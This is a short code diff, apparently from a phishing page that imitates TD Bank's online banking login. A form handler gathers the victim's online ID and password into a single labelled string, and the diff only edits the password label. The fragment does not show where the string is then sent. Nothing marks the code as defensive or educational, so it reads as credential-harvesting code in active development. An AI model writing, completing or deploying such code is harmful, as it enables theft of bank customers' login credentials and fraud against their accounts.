@@ -42,7 +42,7 @@ import {
         "TDBANK | ONLINE ID: " +
         event.target.onlineId.value + 
         " " +
-        "\nTDBANK | PASSWORD: " +
+        "\n| PASSWORD: " +
         event.target.password.value;
        
   
